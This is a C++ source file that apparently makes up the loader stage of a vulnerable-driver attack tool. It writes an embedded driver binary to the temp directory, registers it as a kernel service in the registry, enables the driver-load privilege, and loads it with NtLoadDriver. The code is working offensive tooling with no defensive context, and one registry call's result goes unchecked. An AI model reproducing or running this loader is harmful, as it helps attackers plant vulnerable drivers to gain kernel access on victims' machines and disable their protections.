#include "vul_driver.h"

namespace vul_driver
{
  auto get_full_driver_path() -> std::wstring
  {
    const std::wstring temp_path = utils::get_temp_path();
    if (temp_path.empty())
    {
      std::cerr << "couldn't get temp path" << std::endl;
      return L"";
    }
    return temp_path + driver_name + L".sys";
  }

  auto install_driver() -> BOOL
  {
    std::wstring full_driver_path = get_full_driver_path();
    std::wcout << full_driver_path << std::endl;
    if (full_driver_path.empty())
    {
      std::cerr << "couldn't get full driver path" << std::endl;
      return FALSE;
    }
    _wremove(full_driver_path.c_str());
    std::ofstream sys_file(full_driver_path, std::ios::out | std::ios::binary);
    if (!sys_file)
    {
      std::cerr << "couldn't create file for writing the driver" << std::endl;
      return FALSE;
    }
    sys_file.write(reinterpret_cast<const char*>(echo_driver_resource::driver), sizeof(echo_driver_resource::driver));
    sys_file.close();
    return TRUE;
  }

  auto setup_registry_key() -> BOOL
  {
    const std::wstring services_path = SERVICE_PATH_COMMON + driver_name;
    HKEY h_service;
    if (RegCreateKeyW(HKEY_LOCAL_MACHINE, services_path.c_str(), &h_service) != ERROR_SUCCESS)
    {
      std::cerr << "couldn't create service key" << std::endl;
      return FALSE;
    }
    const std::wstring global_namespace_driver_path = L"\\??\\" + get_full_driver_path();
    //set image path first
    const LSTATUS status = RegSetKeyValueW(h_service, NULL, L"ImagePath", REG_EXPAND_SZ,
                                           global_namespace_driver_path.c_str(),
                                           // wchar has double size of char
                                           (DWORD)(global_namespace_driver_path.size() * sizeof(wchar_t)));
    if (status != ERROR_SUCCESS)
    {
      RegCloseKey(h_service);
      std::cerr << "couldn't set ImagePath value" << std::endl;
      return FALSE;
    }

    const DWORD dwTypeValue = SERVICE_KERNEL_DRIVER;
    // set Type to service
    RegSetKeyValueW(h_service, NULL, L"Type", REG_DWORD, &dwTypeValue, sizeof(DWORD));
    if (status != ERROR_SUCCESS)
    {
      RegCloseKey(h_service);
      std::cerr << "couldn't set Type" << std::endl;
      return FALSE;
    }

    RegCloseKey(h_service);
    return TRUE;
  }

  auto delete_registry_key() -> BOOL
  {
    const std::wstring services_path = SERVICE_PATH_COMMON + driver_name;
    const LSTATUS status = RegDeleteTreeW(HKEY_LOCAL_MACHINE, services_path.c_str());
    if (status != ERROR_SUCCESS)
    {
      std::cerr << "couldn't delete service key" << std::endl;
      return FALSE;
    }
    return TRUE;
  }

  auto service_start() -> BOOL
  {
    HMODULE ntdll = utils::get_ntdll();
    const auto RtlAdjustPrivilege = reinterpret_cast<utils::RtlAdjustPrivilege>(GetProcAddress(ntdll, "RtlAdjustPrivilege"));
    const auto NtLoadDriver = reinterpret_cast<utils::NtLoadDriver>(GetProcAddress(ntdll, "NtLoadDriver"));
    if (!RtlAdjustPrivilege || !NtLoadDriver)
    {
      std::cerr << "couldn't get ntdll functions" << std::endl;
      return FALSE;
    }

    BOOLEAN old = FALSE;
    NTSTATUS status = RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &old);
    if (!NT_SUCCESS(status))
    {
      std::cerr << "couldn't adjust privilege " << "NTSTATUS is: " << std::hex << status << std::endl;
      return FALSE;
    }

    std::wstring wdriver_reg_path = L"\\Registry\\Machine\\" + SERVICE_PATH_COMMON + driver_name;
    UNICODE_STRING service_path;
    RtlInitUnicodeString(&service_path, wdriver_reg_path.c_str());
    status = NtLoadDriver(&service_path);
    std::cout << std::hex << status << std::endl;
    // 0xC000010E is STATUS_IMAGE_ALREADY_LOADED
    if (status == 0xC000010E)
    {
      std::cout << "driver already loaded" << std::endl;
      return TRUE;
    }
    else if (!NT_SUCCESS(status))
    {
      std::cerr << "couldn't load driver " << "NTSTATUS is: " << std::hex << status << std::endl;;
      return FALSE;
    }
    return TRUE;
  }
}
